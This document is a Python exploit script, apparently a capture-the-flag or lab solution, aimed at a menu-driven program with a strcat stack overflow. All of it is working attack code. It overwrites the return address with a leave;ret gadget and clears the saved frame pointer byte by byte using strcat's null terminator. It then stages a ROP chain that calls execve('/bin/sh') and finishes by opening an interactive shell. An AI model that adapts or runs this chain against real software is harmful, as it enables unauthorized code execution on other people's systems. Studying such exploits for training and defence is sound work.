import interact
import struct

# Pack integer 'n' into an 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

p = interact.Process()

# --- Provided Base & Constant Addresses ---
baseaddress_libc = 0x7f000042c000
bin_sh_add       = 0x7f00005b8d57
buffer_addr      = 0x7fffffffecd0

# --- Calculate Absolute Gadget Addresses ---
pop_rdi_ret = baseaddress_libc + 0x21102
pop_rsi_ret = baseaddress_libc + 0x202e8
pop_rax_ret = baseaddress_libc + 0x33544 
syscall     = baseaddress_libc + 0xbc375 
leave_ret   = baseaddress_libc + 0x42351 


# ==================== TURN 1: STAGE THE RIP GADGET ====================
p.readuntil('2. Quit')
p.sendline('1')
p.readuntil('Enter Label Text:')

# Overwrite RIP with leave_ret (strcat safely stops at leave_ret's null bytes)
payload1 = b'A' * 111 + b'B' * 8 + p64(leave_ret)
p.sendline(payload1)


# ==================== TURN 2A: CLEAR 8TH BYTE OF RBP ====================
p.readuntil('2. Quit')
p.sendline('1')
p.readuntil('Enter Label Text:')

# Send exactly 118 non-zero bytes (111 padding + 6 addr + 1 alignment junk)
# This forces strcat to write its terminating \x00 precisely at offset 118
buffer_non_zero = b'\xd0\xec\xff\xff\xff\x7f'
payload2a = b'A' * 111 + buffer_non_zero + b'Z' 
p.sendline(payload2a)


# ==================== TURN 2B: CLEAR 7TH BYTE OF RBP ====================
p.readuntil('2. Quit')
p.sendline('1')
p.readuntil('Enter Label Text:')

# Send exactly 117 non-zero bytes (111 padding + 6 addr)
# This forces strcat to write its terminating \x00 precisely at offset 117,
# leaving the 8th byte cleanly preserved as \x00 from the previous turn!
payload2b = b'A' * 111 + buffer_non_zero
p.sendline(payload2b)


# ==================== TURN 3: STAGE ROP CHAIN IN BUFFER ====================
p.readuntil('2. Quit')
p.sendline('1')
p.readuntil('Enter Label Text:')

rop_chain = b'JUNK_RBP' 
rop_chain += p64(pop_rdi_ret) + p64(bin_sh_add)
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rax_ret) + p64(59)  
rop_chain += p64(syscall)
p.sendline(rop_chain)


# ==================== TURN 4: QUIT & TRIGGER SHELL ====================
p.readuntil('2. Quit')
p.sendline('2') 

p.interactive()